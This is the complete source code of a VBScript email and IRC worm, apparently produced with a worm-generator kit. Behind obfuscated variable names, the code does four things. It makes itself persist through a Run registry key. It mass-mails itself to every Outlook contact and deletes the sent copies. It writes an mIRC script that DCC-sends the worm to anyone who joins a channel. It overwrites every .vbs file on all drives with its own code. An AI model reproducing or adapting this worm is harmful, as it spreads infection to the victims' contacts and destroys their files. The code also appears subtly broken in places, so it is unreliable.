'This file Has been created whit the Vbs Worms Creator 0.8
'Worm Created By [V]orteX
On Error Resume Next
Set qlbyzyatpti = CreateObject("WScript.Shell")
Set ufgkwnbjzdm= Createobject("scripting.filesystemobject")
ufgkwnbjzdm.copyfile wscript.scriptfullname,ufgkwnbjzdm.GetSpecialFolder(0)& "\test.dll.vbs"
qlbyzyatpti.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\test.dll","wscript.exe "&ufgkwnbjzdm.GetSpecialFolder(0)& "\test.dll.vbs %"
if qlbyzyatpti.regread ("HKCU\software\Worm\mailed") <> "1" then
wowyaviwmec()
end if
if qlbyzyatpti.regread ("HKCU\software\Worm\mirqued") <> "1" then
wgbxejaaunb()
end if
mszqzsuhbzw()
fepanpotvcn()
Function wowyaviwmec()
On Error Resume Next
Set otxvkrblusm = CreateObject("Outlook.Application")
If otxvkrblusm= "Outlook"Then
Set chhgjbybqxx=otxvkrblusm.GetNameSpace("MAPI")
For Each fgieqyumdeo In chhgjbybqxx.AddressLists
If fgieqyumdeo.AddressEntries.Count <> 0 Then
For dfmrcicvjut= 1 To fgieqyumdeo.AddressEntries.Count
Set hyhacpcieom = fgieqyumdeo.AddressEntries(dfmrcicvjut)
Set yivrpvdlvpu = otxvkrblusm.CreateItem(0)
yivrpvdlvpu.To = hyhacpcieom.Address
yivrpvdlvpu.Subject = "Here you have, ;o)"
yivrpvdlvpu.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
yivrpvdlvpu.Attachments.Add ufgkwnbjzdm.GetSpecialFolder(0)& "\test.dll.vbs"
yivrpvdlvpu.DeleteAfterSubmit = True
If yivrpvdlvpu.To <> "" Then
yivrpvdlvpu.Send
qlbyzyatpti.regwrite "HKCU\software\Worm\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function wgbxejaaunb(gdstjtwavkp)
On Error Resume Next
if gdstjtwavkp<>"" then
if ufgkwnbjzdm.fileexists("c:\mirc\mirc.ini") then gdstjtwavkp="c:\mirc"
if ufgkwnbjzdm.fileexists("c:\mirc32\mirc.ini") then gdstjtwavkp="c:\mirc32"
porcgjzffnp=qlbyzyatpti.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if ufgkwnbjzdm.fileexists(porcgjzffnp & "\mirc.ini") then gdstjtwavkp=porcgjzffnp & "\mirc"
end if
if gdstjtwavkp <> "" then
set qmygculmxln = ufgkwnbjzdm.CreateTextFile(gdstjtwavkp & "\script.ini", True)
qmygculmxln.WriteLine "[script]"
qmygculmxln.writeline "n0=on 1:JOIN:#:{"
qmygculmxln.writeline "n1=  /if ( $nick == $me ) { halt }"
qmygculmxln.writeline "n2=  /.dcc send $nick "&ufgkwnbjzdm.GetSpecialFolder(0)& "\test.dll.vbs"
qmygculmxln.writeline "n3=}"
qmygculmxln.close
qlbyzyatpti.regwrite "HKCU\software\Worm\Mirqued", "1"
end if
end function
if month(now) =1 and day(now) =26 then
qlbyzyatpti.run "Http://www.virii.com.ar",3,false
end if
Function fepanpotvcn()
On Error Resume Next
Set uskrddrvcqz = ufgkwnbjzdm.Drives
For Each pbkxkqnwnzr In uskrddrvcqz
If pbkxkqnwnzr.Drivetype = Remote Then
wzxdltxxcol= pbkxkqnwnzr & "\"
Call abrueidtqrq(wzxdltxxcol)
ElseIf pbkxkqnwnzr.IsReady Then
wzxdltxxcol= pbkxkqnwnzr&"\"
Call abrueidtqrq(wzxdltxxcol)
End If
Next
End Function
Function abrueidtqrq(slosannvqrn)
Set aoedtoytpwb= ufgkwnbjzdm.GetFolder(slosannvqrn)
Set ssmmzdkyixj= aoedtoytpwb.Files
For Each sysroxwhzeh In ssmmzdkyixj
if ufgkwnbjzdm.GetExtensionName(sysroxwhzeh.path) = "vbs" then
ufgkwnbjzdm.copyfile wscript.scriptfullname , sysroxwhzeh.path , true
end if
if sysroxwhzeh.name = "mirc.ini" then
wgbxejaaunb(sysroxwhzeh.ParentFolder)
end if
Next
Set sysroxwhzeh= aoedtoytpwb.SubFolders
For Each fluufgkwnbj In sysroxwhzeh
Call abrueidtqrq(fluufgkwnbj.path)
Next
End Function
